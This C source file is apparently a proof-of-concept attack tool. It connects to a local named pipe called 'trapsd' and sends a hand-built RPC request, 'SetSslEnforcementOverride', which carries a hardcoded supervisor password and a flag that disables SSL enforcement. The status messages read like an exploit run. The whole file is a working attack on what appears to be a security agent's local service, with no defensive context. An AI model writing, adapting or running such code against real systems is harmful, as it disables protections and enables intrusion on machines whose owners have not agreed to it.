#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define NAMED_PIPE_NAME "\\\\.\\pipe\\trapsd"
#define SUPERVISOR_PASSWORD "test@123"
#define RPC_TIMEOUT 120000

#define FIELD_1_TAG 0x08
#define FIELD_2_TAG 0x12
#define RPC_METHOD_TAG 0x0A
#define RPC_REQUEST_TAG 0x12

int encode_varint(unsigned char *buffer, unsigned long long value)
{
    int len = 0;
    while (value & ~0x7F) {
        buffer[len++] = (unsigned char)((value & 0x7F) | 0x80);
        value >>= 7;
    }
    buffer[len++] = (unsigned char)(value & 0x7F);
    return len;
}

int encode_length_delimited(unsigned char *buffer, const unsigned char *data, int data_len)
{
    int len = 0;
    len += encode_varint(buffer + len, (unsigned long long)data_len);
    memcpy(buffer + len, data, data_len);
    len += data_len;
    return len;
}

int create_request_message(unsigned char *buffer, const char *password, int disable_flag)
{
    int len = 0;
    int pwd_len = strlen(password);

    buffer[len++] = FIELD_1_TAG;
    buffer[len++] = (unsigned char)(disable_flag ? 1 : 0);

    buffer[len++] = FIELD_2_TAG;
    len += encode_length_delimited(buffer + len, (unsigned char *)password, pwd_len);

    return len;
}

int create_rpc_request(unsigned char *buffer, const unsigned char *request_data, int request_len)
{
    int len = 0;
    const char *method_name = "SetSslEnforcementOverride";
    int method_len = strlen(method_name);
    unsigned int message_len;

    unsigned char temp_buffer[1024];
    int temp_len = 0;

    temp_buffer[temp_len++] = RPC_METHOD_TAG;
    temp_len += encode_length_delimited(temp_buffer + temp_len, (unsigned char *)method_name, method_len);

    temp_buffer[temp_len++] = RPC_REQUEST_TAG;
    temp_len += encode_length_delimited(temp_buffer + temp_len, request_data, request_len);

    message_len = (unsigned int)temp_len;
    buffer[0] = (unsigned char)(message_len & 0xFF);
    buffer[1] = (unsigned char)((message_len >> 8) & 0xFF);
    buffer[2] = (unsigned char)((message_len >> 16) & 0xFF);
    buffer[3] = (unsigned char)((message_len >> 24) & 0xFF);

    memcpy(buffer + 4, temp_buffer, temp_len);

    return 4 + temp_len;
}

int main(int argc, char *argv[])
{
    HANDLE pipe_handle;
    DWORD bytes_written, bytes_read;
    unsigned char request_buffer[512];
    unsigned char response_buffer[1024];
    int request_len;
    int message_len;

    unsigned char request_message[256];
    message_len = create_request_message(request_message, SUPERVISOR_PASSWORD, 1);
    printf("[+] Created request message (%d bytes)\n", message_len);

    request_len = create_rpc_request(request_buffer, request_message, message_len);
    printf("[+] Created RPC request (%d bytes)\n", request_len);

    printf("[*] Connecting to trapsd service...\n");
    pipe_handle = CreateFileA(
        NAMED_PIPE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED,
        NULL
    );

    if (pipe_handle == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        printf("[-] Failed to connect to trapsd service. Error code: %lu (0x%lx)\n", error, error);
        return 1;
    }

    printf("[+] Connected to trapsd service\n");

    printf("[*] Sending RPC request...\n");
    if (!WriteFile(pipe_handle, request_buffer, request_len, &bytes_written, NULL)) {
        DWORD error = GetLastError();
        printf("[-] Failed to write to pipe. Error code: %lu\n", error);
        CloseHandle(pipe_handle);
        return 1;
    }

    printf("[+] Sent RPC request (%lu bytes written)\n", bytes_written);

    printf("[*] Waiting for response...\n");
    if (!ReadFile(pipe_handle, response_buffer, sizeof(response_buffer), &bytes_read, NULL)) {
        DWORD error = GetLastError();
        printf("[-] Failed to read from pipe. Error code: %lu\n", error);
        CloseHandle(pipe_handle);
        return 1;
    }

    printf("[+] Received response (%lu bytes)\n", bytes_read);
    if (bytes_read > 0) {
        if (bytes_read >= 4) {
            unsigned int response_len = response_buffer[0] |
                                       (response_buffer[1] << 8) |
                                       (response_buffer[2] << 16) |
                                       (response_buffer[3] << 24);
            printf("Response message length: %u bytes\n", response_len);
        }
    }

    CloseHandle(pipe_handle);

    return 0;
}